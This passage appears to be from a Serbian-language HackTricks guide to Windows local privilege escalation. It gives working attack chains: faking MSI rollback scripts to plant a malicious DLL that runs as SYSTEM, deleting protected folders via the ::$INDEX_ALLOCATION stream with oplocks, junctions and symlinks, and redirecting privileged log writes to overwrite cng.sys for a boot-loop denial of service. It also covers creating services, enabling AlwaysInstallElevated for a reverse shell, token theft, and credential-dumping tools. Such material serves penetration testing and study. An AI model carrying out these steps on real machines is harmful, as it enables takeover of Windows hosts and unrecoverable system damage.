    - Препишите `.rbs` датотеку **лажном rollback скриптом** која налаже Windows-у да:
        - Врати вашу `.rbf` датотеку (злонамерни DLL) на **привилеговану локацију** (нпр. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Поставите лажни `.rbf` који садржи **злонамерни DLL payload на нивоу SYSTEM-а**.

- Корак 12: Покрените rollback
    - Пошаљите сигнал за синхронизацију како би installer наставио.
    - **Прилагођена акција типа 19 (`ErrorOut`)** је подешена да **намерно обори инсталацију** у познатом тренутку.
    - Тиме се покреће **rollback**.

- Корак 13: SYSTEM инсталира ваш DLL
    - Windows Installer:
        - Чита ваш злонамерни `.rbs`.
        - Копира ваш `.rbf` DLL на циљну локацију.
    - Сада имате свој **злонамерни DLL на путањи коју учитава SYSTEM**.

- Завршни корак: Извршите SYSTEM код
    - Покрените поуздан **auto-elevated бинарни фајл** (нпр. `osk.exe`) који учитава DLL над којим сте преузели контролу.
    - **Бум**: ваш код се извршава **као SYSTEM**.


### Од Arbitrary File Delete/Move/Rename до SYSTEM EoP

Главна MSI rollback техника (претходна) подразумева да можете да избришете **целу фасциклу** (нпр. `C:\Config.Msi`). Али шта ако ваша рањивост омогућава само **произвољно брисање датотека**?

Можете да искористите **NTFS интерне механизме**: свака фасцикла има скривени alternate data stream који се зове:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** foldera.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** foldera, NTFS **uklanja ceo folder** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitiva ne dozvoljava da brišete proizvoljne datoteke/fascikle, ali vam **dozvoljava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu i datoteku-mamac
- Kreirajte: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- **oplock** pauzira izvršavanje kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokreni SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada naiđe na `file1.txt`, **oplock se aktivira** i predaje kontrolu tvom callback-u.

4. Korak 4: Unutar oplock callback-a – preusmeri brisanje

- Opcija A: Premesti `file1.txt` na drugo mesto
    - Ovo prazni `folder1` bez prekidanja oplock-a.
    - Nemoj direktno da obrišeš `file1.txt` — time bi se oplock prerano oslobodio.

- Opcija B: Pretvori `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok koji čuva metapodatke fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja da radi i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM-a.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitive koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako ga **unapred kreirate kao fasciklu**, Windows ne može da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne može da pronađe stvarni drajver** i **ruši sistem ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja datoteka / boot DoS

Kada **privilegovana usluga** upisuje logove/izvoze na putanju pročitanu iz **podesive konfiguracije**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Zahtevi**
- Napadač ima dozvolu za upis u konfiguraciju koja sadrži ciljnu putanju (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali privilegovano odredište loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada vrši u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu ciljnu datoteku (hex/PE parserom) da biste potvrdili oštećenje; ponovnim pokretanjem Windows će učitati izmenjenu putanju drajvera → **boot loop DoS**. Ovo se odnosi i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, može prvo biti pokušan njen odabir, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Novi servis**

Ako već radite u procesu sa nivoom High Integrity, **put do SYSTEM** može biti jednostavan: samo **napravite i pokrenite novi servis**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Kada kreirate servisni binarni fajl, proverite da li je validan servis ili da li binarni fajl brzo obavlja neophodne radnje, jer će biti ugašen za 20 sekundi ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa visokim integritetom možete pokušati da **omogućite AlwaysInstallElevated unose u registru** i **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o uključenim ključevima registra i tome kako da instalirate _.msi_ paket možete pronaći ovde.](#alwaysinstallelevated)

### Visok integritet + SeImpersonate privilegija do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do privilegija Full Token

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima visok integritet), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) uz SeDebug privilegiju, **kopirate token** procesa i kreirate **proizvoljan proces koristeći taj token**.\
Ova tehnika se obično koristi za **izbor bilo kog procesa koji se izvršava kao SYSTEM sa svim privilegijama tokena** (_da, možete pronaći SYSTEM procese koji nemaju sve privilegije tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika podrazumeva **kreiranje pipe-a, a zatim kreiranje/zloupotrebu servisa za pisanje u taj pipe**. Zatim će **server** koji je kreirao pipe koristeći privilegiju **`SeImpersonate`** moći da **impersonira token** pipe klijenta (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog integriteta na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete DLL** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija; osim toga, mnogo ga je **lakše izvesti iz procesa sa visokim integritetom**, jer će taj proces imati **dozvole za pisanje** u fascikle koje se koriste za učitavanje DLL-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Otkriven.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Otkriven.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprovodi password spraying sa prikupljenim lozinkama na domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS alat za spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate ranjivosti za privesc (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su administratorska prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate ranjivosti za privesc (mora da se kompajlira pomoću VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći pogrešne konfiguracije (više alat za prikupljanje informacija nego za privesc) (mora da se kompajlira) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz brojnih programa (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (precompiled izvršna datoteka na github-u). Ne preporučuje se. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Lokalni**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje exploite koji rade (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje exploite koji rade (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na žrtvinom hostu, možete da izvršite:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windowsu](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Podizanje privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windowsu – kratki priručnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – radionica za lokalnu eskalaciju privilegija u Windowsu i Linuxu](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Napadi na Windows: AT je novi hit (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija – Windows – kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – eskalacija privilegija – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windowsu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windowsu](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windowsu](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windowsu za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje akreditiva iz hMailServer-a → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string-a + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox-om: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba alata CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću. Zloupotreba simboličkih veza u Windowsu](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: opasno razrešavanje modula u Windowsu](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – rešeni izazovi iz kontrolne liste za C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: ulančavanje CLDFLT i uslova utrke u DirectX kernelu za Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da vlada svima: primitiva za potpuno čitanje/pisanje u Windowsu 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – exploit kod za FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windowsu 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – izdvajanje privatnih SSH ključeva iz SSH agenta u Windowsu 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih ažuriranja u preduzećima u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih ažuriranja u preduzećima u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
